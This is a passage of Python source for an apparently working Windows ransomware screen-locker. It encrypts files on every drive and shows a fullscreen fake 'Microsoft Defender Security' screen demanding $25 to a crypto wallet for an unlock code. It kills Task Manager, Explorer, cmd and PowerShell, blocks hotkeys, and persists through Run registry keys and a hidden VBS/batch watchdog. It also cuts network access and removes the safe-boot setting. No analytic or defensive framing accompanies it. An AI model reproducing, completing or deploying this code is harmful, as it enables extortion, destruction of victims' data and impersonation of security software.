            for disk_path in [
                _disk + ':\\' for _disk in [
                'A', 'B', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 
                'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
                ] if exists(_disk + ':\\')
            ]:
                try: 
                    _cryptographer(list(walk(disk_path)))
                except: 
                    continue

            try: 
                with open(r'C:\Windows\Temp\Windows.system.blocker\scanner.mode\mode.txt', 'w') as mode_txt: 
                    mode_txt.write('1')
            except: ...

        label_file_path['text'] = 'Scanning completed successfully' if language == 'en' else 'Сканирование завершено успешно'

        Label(root, text='Enter the access code' if language == 'en' else 'Введите код доступа', 
              font=('Comic Sans MS', 20, 'bold'), bg='#2b68c4', fg='white').pack(pady=35)
        (entry_password := Entry(root, show='*', font=('Comic Sans MS', 16, 'bold'), 
               bg='#0e5bcf', fg='white', selectbackground='blue', selectforeground='white', insertbackground='white', width=22, bd=2)).pack()
        Button(root, text='unlock' if language == 'en' else 'разблокировать', font=('Comic Sans MS', 16, 'bold'), 
               bg='#2b68c4', fg='white', activebackground='#2b68c4', activeforeground='white', width=18, bd=1, command=password_check).pack(pady=25)


    def update_time():
        while True:
            try:
                timer['text'] = ctime().split()[-2]
                root.update()
            except RuntimeError: 
                return
            except: 
                continue


    def password_check():
        if entry_password.get().strip() == PASSWORD: 
            showinfo('Windows', 'Your computer is unlocked' if language == 'en' else 'Ваш компьютер разблокирован')
            
            root.destroy()

            try:
                run(r'rd /Q /S C:\Windows\Temp\Windows.system.blocker'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
            except:...

            try: 
                regedit(r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'Windows Blocker', None, None, 2)
            except: ...

            run('ipconfig /renew'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
            run('shutdown /f /r /t 0'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True), abort()
        else: 
            showerror('Windows', 'Invalid access code' if language == 'en' else 'Неверный код доступа')
            entry_password.delete(0, 'end')
    
    
    def menu(_language, mode=0): 
        global language, label_file_path

        language = _language

        try:
            with open(r'C:\Windows\Temp\Windows.system.blocker\language\language.txt', 'w') as language_txt: 
                language_txt.write(language)
        except: ...

        if mode == 0: 
            button_english.pack_forget()
            button_russian.pack_forget()

        Label(root, text='Windows Locked' if language == 'en' else 'Windows Заблокирована', 
              font=('Comic Sans MS', 20, 'bold'), bg='#004fe3', fg='white').place(x=75, y=10)
        Label(root, text='Microsoft Defender Security' if language == 'en' else 'Microsoft Defender Security ', 
              font=('Comic Sans MS', 20, 'bold'), bg='#2b68c4', fg='white').pack(side='top', pady=8)
        Label(root, text='A zero-day vulnerability and a ransomware virus have been detected on your computer.\nFor your safety, Windows is locked to ensure your data integrity.' if language == 'en' else 'На вашем компьютере обнаружена уязвимость нулевого дня и вирус-вымогатель.\nВ целях вашей безопасности Windows заблокирована для обеспечения целостности ваших данных.', 
              font=('Comic Sans MS', 18, 'bold'), bg='#2b68c4', fg='white').pack()
        Label(root, text='To unlock Windows you need' if language == 'en' else 'Для разблокировки Windows вам необходимо', 
              font=('Comic Sans MS', 20, 'bold'), bg='#2b68c4', fg='white').pack(pady=8)
        Label(root, text=f'1: Would not log out of Microsoft Defender Security.\n2: Wait until scanning is completed.\n3: You need to deposit $25 dollars to this wallet {WALLET} for our security service, and for unlocking Windows.\nIf you have paid for the service, you will receive an access code.' if language == 'en' else f'1: Не выходит из системы Microsoft Defender Security.\n2: Подождите, пока сканирование завершится.\n3: Вам необходимо внести $25 долларов на этот кошелек {WALLET} за нашу службу безопасности, и за разблокировку Windows.\nЕсли вы оплатили услугу, вы получите код доступа.', 
              font=('Comic Sans MS', 18, 'bold'), bg='#2b68c4', fg='white').pack()
        Label(root, text=f'{"Node" if language == "en" else "Узел"}: {node()}\n{"Platform" if language == "en" else "Платформа"}: {system()} {release()} {win32_edition()}\n{"Date" if language == "en" else "Дата"}: {(time := localtime()).tm_mday}.{time.tm_mon}.{time.tm_year}', 
              font=('Comic Sans MS', 18, 'bold'), bg='#2b68c4', fg='white').pack()
        Label(root, text='Scanning' if language == 'en' else 'Cканирование', 
              font=('Comic Sans MS', 20, 'bold'), bg='#2b68c4', fg='white').pack(pady=20) 
        (label_file_path := Label(root, text='', font=('Comic Sans MS', 16, 'bold'), bg='#2b68c4', fg='white')).pack()
        
        Thread(target=cryptographer, name='cryptographer').start()
    
    root = Tk()
    root.config(bg='#2b68c4')
    root.protocol('WM_DELETE_WINDOW', lambda: ...)
    root.attributes('-topmost', True)
    root.overrideredirect(True)
    root.geometry(f'{root.winfo_screenwidth()}x{root.winfo_screenheight()}')

    Label(root, text='', bg='#004fe3', height=4, width=400).place(x=0, y=0)
    (timer := Label(root, text=ctime().split()[-2], 
                    font=('Comic Sans MS', 18, 'bold'), bg='#004fe3', fg='white', pady=12)).pack() 
    Thread(target=update_time, name='update_time').start()
    
    logo = Label(root, bg='#004fe3')
    logo.image = PhotoImage(file=r'C:\Windows\Temp\Windows.system.blocker\logo\logo.png').subsample(10, 10)
    logo['image'] = logo.image 
    logo.place(x=5, y=4)

    try:
        with open(r'C:\Windows\Temp\Windows.system.blocker\language\language.txt', 'r') as language_txt: 
            _language = language_txt.read()
    except: 
        (button_english := Button(root, text='English', font=('Comic Sans MS', 23, 'bold'), 
            bg='#268ede', fg='white', activebackground='#268ede', activeforeground='white', bd=1, 
            borderwidth=1, width=8, height=2, command=lambda: menu('en'))).pack(pady=180)
        (button_russian := Button(root, text='Русский', font=('Comic Sans MS', 23, 'bold'), 
            bg='#268ede', fg='white', activebackground='#268ede', activeforeground='white', 
            bd=1, borderwidth=1, width=8, height=2, command=lambda: menu('ru'))).pack()
    else: 
        menu(_language, mode=1)

    root.mainloop()


def agent():
    PATH_SYS = r'C:\Windows\Temp\Windows.system.blocker\sys'

    WINLOCKER_NAME_REG = 'Windows Blocker'
    WINLOCKER_PATH = r'C:\Windows\Temp\Windows.system.blocker\Windows Blocker.exe'
    WINLOCKER_ALT_PATH = rf'C:\Users\{USER}\AppData\Local\Temp\Windows Blocker.exe'

    RUN_KEY = r'Software\Microsoft\Windows\CurrentVersion\Run'
    SA_KEY = r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'


    def set_autorun():
        try:
            with OpenKey(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE) as key:
                SetValueEx(key, WINLOCKER_NAME_REG, 0, REG_SZ, f'"{WINLOCKER_PATH}"')
        except:
            return


    def check_and_restore_run():
        try:
            with OpenKey(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_READ) as key:
                value, _ = QueryValueEx(key, WINLOCKER_NAME_REG)

                if value.strip() != f'"{WINLOCKER_PATH}"':
                    set_autorun()
        except:
            set_autorun()


    def check_and_reset():
        try:
            with OpenKey(HKEY_CURRENT_USER, SA_KEY, 0, KEY_READ | KEY_WRITE) as key:
                data, _ = QueryValueEx(key, WINLOCKER_NAME_REG)

                if isinstance(data, bytes) and len(data) > 0 and data[0] == 3:
                    DeleteValue(key, WINLOCKER_NAME_REG)
                    set_autorun()
        except:
            return


    def checker():
        nonlocal counter_support_winlocker

        while True:
            try: 
                for onefile in glob(rf'C:\Users\{USER}\AppData\Local\Temp\*'):
                    try:
                        if 'onefile' in onefile: 
                            run(f'attrib +h +s +r {onefile}'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                    except: 
                        continue    
            except: ...

            try:
                try:
                    if not exists(rf'C:\Users\{USER}\AppData\Local\Temp'):
                        mkdir(rf'C:\Users\{USER}\AppData\Local\Temp')
                except: ...

                try:
                    if not exists(WINLOCKER_ALT_PATH):
                        copy(WINLOCKER_PATH, WINLOCKER_ALT_PATH)
                        run(rf'attrib +h +s +r {WINLOCKER_ALT_PATH}'.split(), 
                            stdout=DEVNULL, stderr=DEVNULL, shell=True)
                except: ...

                try:
                    if counter_support_winlocker % 3 == 0:
                        with open(rf'{PATH_SYS}\kernel.flag', 'r') as kernel_flag:
                            if kernel_flag.read().strip() != '1':
                                support_winlocker()
                except: ...

                try: 
                    regedit_change()
                except: ...

                try:
                    check_and_restore_run()
                    check_and_reset()
                except: ...

                try:
                    with open(rf'{PATH_SYS}\kernel.flag', 'w') as kernel_flag:
                        kernel_flag.write('0')
                    
                    counter_support_winlocker += 1
                except: ...

                sleep(5)
            except: 
                continue


    def hotkey_blocker():
        for hotkey in [
            'windows', 'left windows', 'right windows', 'enter', 'space', 'ctrl', 'left ctrl', 'right ctrl', 'shift', 'left shift', 'right shift', 
            'alt', 'alt gr', 'left alt', 'right alt', 'tab', 'caps lock', 'up', 'down', 'left', 'right', 'insert', 'home', 
            'page up', 'page down', 'delete', 'decimal', 'end', 'print screen', 'scroll lock', 'pause', 'num lock', 'clear', 
            'esc', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12'
        ]: 
            try: 
                block_key(hotkey)
            except: 
                continue


    def killer_bad_process():
        while True: 
            try:
                try:
                    for bad_process in findall(
                        r'(explorer.exe|osk.exe|mmc.exe|cmd.exe|mstsc.exe|frgui.exe|iscsicpl.exe|regedit.exe|perfmon.exe|odbcad32.exe|msconfig.exe|Taskmgr.exe|powershell.exe|CCleaner32.exe|CCleaner64.exe|quickassist.exe|powershell_ise.exe|SystemSettings.exe|ProcessHacker.exe|OldNewExplorerCfg.exe)',
                        run('tasklist', stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').lower()
                    ): 
                        Popen(['taskkill', '/f', '/IM', bad_process], stdout=DEVNULL, stderr=DEVNULL, shell=True)

                    run('ipconfig /release'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                    run('bcdedit /deletevalue {current} safeboot'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                except: ...

                sleep(1)
            except: 
                continue

    
    def support_winlocker():
        with open(f'{PATH_SYS}\\script.vbs', 'w') as script_vbs:
            script_vbs.write(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "{PATH_SYS}\\kernel.bat", 0, False')

        with open(f'{PATH_SYS}\\kernel.bat', 'w') as script_vbs:
            script_vbs.write(rf'''
@echo off
setlocal
set "APP_NAME=Windows Blocker.exe"
set "APP_PATH={WINLOCKER_PATH}"
set "ALT_APP_PATH={WINLOCKER_ALT_PATH}"  
set "FLAG_FILE={PATH_SYS}\kernel.flag"
:loop
echo 1 > "%FLAG_FILE%"
tasklist /FI "IMAGENAME eq %APP_NAME%" | find /I "%APP_NAME%" >nul
if errorlevel 1 (
    if exist "%APP_PATH%" (
        start "" "%APP_PATH%"
    ) else (
        if exist "%ALT_APP_PATH%" (
            start "" "%ALT_APP_PATH%"
        )
    )
)
timeout /t 3 /nobreak >nul
goto loop
'''.strip())
        
        startfile(f'{PATH_SYS}\\script.vbs')


    support_winlocker()
    counter_support_winlocker = 1
    Thread(target=checker, name='checker').start()
    hotkey_blocker()
    killer_bad_process()


def main(): 
    if ((not WALLET) or (not PASSWORD) or (not KEY)) or (WALLET == 'HERE IS LINCLOKER WALLET' or PASSWORD == 'HERE IS LINLOCKER PASSWORD' or KEY == 'HERE IS LINLOCKER ENCRYPTOR PASSWORD'):
        print('initialized data is invalid')
        abort()
    
    if not exists(r'C:\Windows'):
        print('DO NOT SUPPORT OS')
        abort()

    if not exists(r'C:\Windows\Temp\Windows.system.blocker\logo\logo.png'):
        setup() 
    else: 
        Thread(target=agent, name='agent').start()
        window()



main()
